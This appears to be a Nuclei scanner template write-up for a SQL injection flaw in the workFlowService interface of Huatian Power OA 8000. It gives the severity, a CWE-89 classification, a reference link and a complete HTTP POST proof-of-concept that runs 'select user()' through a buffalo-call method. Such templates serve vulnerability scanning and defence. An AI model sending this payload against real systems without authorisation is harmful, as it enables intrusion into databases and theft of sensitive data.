# Nuclei Template: Huatian Power OA 8000 - SQL Injection
**Template ID:** huatian-oa-sqli
**Vulnerability Class:** SQL Injection
**Severity:** High
**CWE:** CWE-89
**Source:** Nuclei Template (`huatian-oa-sqli.yaml`)

## Vulnerability Information & PoC

## Description
There is a SQL injection vulnerability in the workFlowService interface of Huatian Power OA 8000. An attacker can exploit this vulnerability to obtain sensitive database information.

## Steps to reproduce / Exploit Payload
```http
POST /OAapp/bfapp/buffalo/workFlowService HTTP/1.1
Host: {{Hostname}}

<buffalo-call>
<method>getDataListForTree</method>
<string>select user()</string>
</buffalo-call>
```

## References
- https://blog.csdn.net/qq_41617034/article/details/124305120
